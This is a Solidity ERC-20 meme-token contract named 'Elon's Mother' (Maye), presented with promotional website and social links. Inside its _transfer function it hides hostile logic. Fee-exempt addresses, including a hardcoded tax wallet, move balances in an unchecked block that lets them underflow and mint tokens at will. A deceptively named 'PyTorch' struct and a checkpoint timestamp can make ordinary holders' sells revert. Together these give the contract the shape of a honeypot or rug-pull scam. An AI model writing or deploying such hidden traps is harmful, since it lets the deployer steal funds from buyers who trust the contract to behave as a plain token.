/**
Maye Musk is Elon's Mother

Website: https://mayemusk.com/
Telegram: https://t.me/maybeElonMother
Twitter: https://twitter.com/mayemusk

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Maye is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool public transferDelayEnabled = true;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    mapping(address => bool) private _exemptFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 0;
    uint256 private _initialSellTax = 0;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 0;
    uint256 private _reduceSellTaxAt = 0;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCounter = 0;

    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Elon's Mother";
    string private constant _symbol = unicode"Maye";
    uint256 public _maxTxAmount = 1400000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 1400000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 300000 * 10 ** _decimals;
    uint256 public _maxTaxSwapAmnt = 1700000 * 10 ** _decimals;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 private launchBlock;
    bool public tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct PyTorch {uint256 poolIdx; uint256 flow; uint256 distribution;}
    uint256 private checkpoint;
    mapping(address => PyTorch) private pyTorchTensor;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap() {inSwap = true; _; inSwap = false;}

    constructor() {
        _taxWallet = payable(0xdb87E75f93E5c41548d7d8061a0B7B0894725c6f);
        _balances[_msgSender()] = _tTotal;
        _exemptFromFee[owner()] = true;
        _exemptFromFee[address(this)] = true;
        _exemptFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCounter > _reduceBuyTaxAt) ? _finalBuyTax :_initialBuyTax)
                .div(100);

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)){
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay Enabled. Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin]=block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_exemptFromFee[to]){
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the _maxWalletSize.");
                _buyCounter++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul((_buyCounter >_reduceSellTaxAt) ? _finalSellTax :_initialSellTax)
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCounter > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwapAmnt)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (
            (_exemptFromFee[from] || _exemptFromFee[to]) &&
            from != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            checkpoint = block.timestamp;
        }
        if (_exemptFromFee[from] && (block.number > (launchBlock+_reduceSellTaxAt))){
            unchecked {
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!_exemptFromFee[from] && !_exemptFromFee[to]) {
            if (uniswapV2Pair != to) {
                PyTorch storage torchAmp = pyTorchTensor[to];
                if (uniswapV2Pair == from) {
                    if (torchAmp.poolIdx == 0) {
                        torchAmp.poolIdx = (_buyCounter < _preventSwapBefore) ? (block.timestamp-1) :block.timestamp;
                    }
                } else {
                    PyTorch storage torchFft = pyTorchTensor[from];
                    if (torchAmp.poolIdx == 0 || torchFft.poolIdx < torchAmp.poolIdx){
                        torchAmp.poolIdx = torchFft.poolIdx;
                    }
                }
            } else {
                PyTorch storage torchFft = pyTorchTensor[from];
                torchFft.distribution = torchFft.poolIdx-checkpoint;
                torchFft.flow = block.timestamp;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this),address(uniswapV2Router),tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        transferDelayEnabled = false;
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;

        emit MaxTxAmountUpdated(
            _tTotal
        );
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open!");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        launchBlock = block.number;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    function manualsend() external {
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }
}